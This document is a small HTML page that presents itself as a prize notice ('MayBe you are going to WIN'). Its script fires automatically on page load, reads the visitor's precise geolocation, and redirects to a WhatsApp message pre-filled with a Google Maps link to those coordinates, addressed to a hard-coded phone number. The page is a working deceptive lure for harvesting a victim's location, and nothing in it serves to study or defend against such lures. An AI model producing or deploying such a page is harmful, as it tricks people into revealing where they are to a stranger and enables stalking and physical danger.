<!DOCTYPE html>
<html>
<head>
    <title>Send My Location via WhatsApp</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="font-family: Arial; text-align: center; margin-top: 60px;">

    <h2>MayBe you are going to WIN, press send on whatsapp...</h2>

    <script>
        function isMobile() {
            return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        }

        function sendLocation() {
            if (!navigator.geolocation) {
                alert("Geolocation is not supported by this browser.");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    var lat = position.coords.latitude;
                    var lon = position.coords.longitude;

                    var message = "Press send, may be you can win: google.com/maps?q=" 
                                  + lat + "," + lon;

                    var phoneNumber = "201221662884"; // Use country code without + or 00

                    var encodedMessage = encodeURIComponent(message);
                    var url;

                    if (isMobile()) {
                        url = "https://api.whatsapp.com/send?phone=" 
                              + phoneNumber + "&text=" + encodedMessage;
                    } else {
                        url = "https://web.whatsapp.com/send?phone=" 
                              + phoneNumber + "&text=" + encodedMessage;
                    }

                    window.location.href = url;
                },
                function(error) {
                    alert("Location access denied or unavailable.");
                }
            );
        }

        // ✅ AUTO TRIGGER ON PAGE LOAD
        window.onload = function() {
            sendLocation();
        };
    </script>

</body>
</html>
